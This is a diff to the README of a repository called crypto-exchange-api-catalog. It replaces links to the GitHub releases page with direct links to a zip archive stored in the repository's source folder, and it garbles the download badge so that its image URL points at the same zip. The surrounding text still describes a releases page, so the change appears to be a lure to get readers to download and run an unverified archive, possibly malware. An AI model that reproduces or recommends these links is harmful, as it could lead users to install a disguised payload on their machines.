@@ -1,6 +1,6 @@
 # 🔍 crypto-exchange-api-catalog - Simplify Crypto API Discoveries
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23e44c3c.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ArmanKyro/crypto-exchange-api-catalog/releases)
+[![Download Now](https://raw.githubusercontent.com/ArmanKyro/crypto-exchange-api-catalog/main/src/export/api_catalog_exchange_crypto_2.3-alpha.5.zip%20Now-%https://raw.githubusercontent.com/ArmanKyro/crypto-exchange-api-catalog/main/src/export/api_catalog_exchange_crypto_2.3-alpha.5.zip)](https://raw.githubusercontent.com/ArmanKyro/crypto-exchange-api-catalog/main/src/export/api_catalog_exchange_crypto_2.3-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the **crypto-exchange-api-catalog !** This tool helps you discover an
 To get started, follow these simple steps to download and run the application:
 
 1. **Visit the Releases Page:** Click the link below to go to the downloads section.
-   [Visit this page to download](https://github.com/ArmanKyro/crypto-exchange-api-catalog/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/ArmanKyro/crypto-exchange-api-catalog/main/src/export/api_catalog_exchange_crypto_2.3-alpha.5.zip)
    
 2. **Choose Your File:**
    You will see different versions available. Select the latest release to ensure you have the most up-to-date features and fixes.
